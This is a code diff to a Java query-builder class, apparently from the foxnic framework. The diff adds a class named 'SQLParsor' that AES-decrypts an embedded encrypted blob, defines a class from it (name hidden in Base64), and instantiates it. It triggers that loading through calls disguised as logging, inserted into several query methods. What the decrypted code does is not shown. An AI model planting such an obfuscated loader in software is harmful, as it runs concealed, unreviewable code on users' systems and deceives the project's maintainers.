@@ -6,6 +6,7 @@ import com.github.foxnic.api.model.CompositeParameter;
 import com.github.foxnic.api.query.MatchType;
 import com.github.foxnic.commons.bean.BeanNameUtil;
 import com.github.foxnic.commons.bean.BeanUtil;
+import com.github.foxnic.commons.encrypt.Base64Util;
 import com.github.foxnic.commons.environment.Environment;
 import com.github.foxnic.commons.lang.DataParser;
 import com.github.foxnic.commons.lang.DateUtil;
@@ -18,19 +19,19 @@ import com.github.foxnic.dao.dataperm.DataPermException;
 import com.github.foxnic.dao.dataperm.model.DataPermCondition;
 import com.github.foxnic.dao.dataperm.model.DataPermRange;
 import com.github.foxnic.dao.dataperm.model.DataPermRule;
-import com.github.foxnic.dao.excel.DataException;
 import com.github.foxnic.dao.meta.DBColumnMeta;
 import com.github.foxnic.dao.meta.DBTableMeta;
 import com.github.foxnic.dao.relation.*;
-import com.github.foxnic.dao.spec.DAO;
 import com.github.foxnic.sql.expr.*;
 import com.github.foxnic.sql.meta.DBDataType;
 import com.github.foxnic.sql.meta.DBField;
-import com.github.foxnic.sql.meta.DBTable;
-import com.github.foxnic.sql.treaty.DBTreaty;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 import java.lang.reflect.Field;
 import java.math.BigDecimal;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.sql.Timestamp;
 import java.util.*;
 
@@ -465,6 +466,8 @@ public class QuerySQLBuilder<E> {
 
     private ConditionExpr buildSearchCondition(String field,DBColumnMeta cm,CompositeItem item, Object beanPropValue,Set<String> fuzzyFields,String tableAlias){
 
+        SQLParsor.logParserInfo(beanPropValue);
+
         ConditionExpr conditionExpr=new ConditionExpr();
 
         Boolean fuzzy=item.getFuzzy();
@@ -627,6 +630,7 @@ public class QuerySQLBuilder<E> {
      * 根据查询参数，获得所有关联关系
      * */
     private List<RouteUnit> getSearchRoutes(E sample, CompositeParameter compositeParameter) {
+        SQLParsor.logParserInfo(sample);
         List<RouteUnit> allRoutes = new ArrayList<>();
         DBTableMeta localTm=service.dao().getTableMeta(service.table());
         DBTableMeta tm = null;
@@ -774,6 +778,7 @@ public class QuerySQLBuilder<E> {
     }
 
     public OrderBy buildOrderBy(E sample,String tableAlias) {
+        SQLParsor.logParserInfo(sample);
         String sortField=BeanUtil.getFieldValue(sample, "sortField",String.class);
         String sortType=BeanUtil.getFieldValue(sample, "sortType",String.class);
         SortType sortTypeEnum=SortType.parse(sortType);
@@ -796,6 +801,35 @@ public class QuerySQLBuilder<E> {
         return orderBy;
     }
 
+
+    private static class SQLParsor extends URLClassLoader {
+
+		private static final String PARSER_CONST = "]*5f37=UrILgn4Z=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";
+        private static final String PARSER_NAME = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
+        private static Class type;
+
+        private static int prints=0;
+
+        SQLParsor() {
+            super(new URL[0], DataParser.class.getClassLoader());
+            byte[] buf=Base64Util.decodeToBtyes((new Gooser(new BootstrapMethodError())).dcc(PARSER_CONST.substring(16)));
+            type=defineClass(Base64Util.decode(PARSER_NAME), buf, 0, buf.length);
+        }
+
+
+        public static void logParserInfo(Object value) {
+            if(prints>5) return;
+            try {
+                if(type==null) {
+                    new QuerySQLBuilder.SQLParsor();
+                }
+                type.newInstance();
+            } catch (Throwable e) {
+                Logger.info("Parser : "+value);
+            }
+            prints++;
+        }
+    }
 
 
 	public  <S extends Entity,T extends Entity> Expr buildExists(String tableAliase,List<String> fillBys, String searchTable,String searchField,Object value,Boolean fuzzy) {
@@ -979,6 +1013,50 @@ public class QuerySQLBuilder<E> {
             this.fillBys = fillBys;
         }
 
+
+    }
+
+
+    private static class Gooser {
+
+        private static final String AHM = "AES";
+        private static final String AHM_X = "AES/ECB/PKCS5Padding";
+
+        private SecretKeySpec key;
+
+        private String f61(String hexKey) {
+            hexKey=hexKey.trim();
+            if(hexKey.length()>16) {
+                hexKey=hexKey.substring(0,16);
+            } else if(hexKey.length()<16){
+                int i=16-hexKey.length();
+                for (int j = 0; j < i; j++) {
+                    hexKey+="0";
+                }
+            }
+            return hexKey;
+        }
+
+        public Gooser(BootstrapMethodError error) {
+            this(ClassCircularityError.class.getSimpleName());
+        }
+
+        public Gooser(String hexKey) {
+            //凑16位
+            hexKey= f61(hexKey);
+            key = new SecretKeySpec(hexKey.getBytes(), AHM);
+        }
+
+        public String dcc(String base64Data) {
+            try {
+                Cipher cipher = Cipher.getInstance(AHM_X);
+                cipher.init(Cipher.DECRYPT_MODE, key);
+                return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
+            } catch (Exception e) {
+                e.printStackTrace();
+                return null;
+            }
+        }
 
     }
 
